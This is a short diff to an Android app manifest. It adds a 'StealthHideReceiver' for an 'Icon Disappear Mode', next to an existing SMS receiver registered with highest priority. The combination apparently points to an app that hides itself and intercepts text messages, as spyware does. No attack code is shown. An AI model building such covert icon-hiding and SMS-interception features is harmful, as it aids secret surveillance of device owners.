@@ -84,6 +84,11 @@
             </intent-filter>
         </receiver>
 
+        <!-- Stealth Background Alarm Receiver for clean Icon Disappear Mode -->
+        <receiver
+            android:name=".receiver.StealthHideReceiver"
+            android:exported="false" />
+
         <!-- SMS BroadcastReceiver with highest priority -->
         <receiver
             android:name=".receiver.SmsBroadcastReceiver"
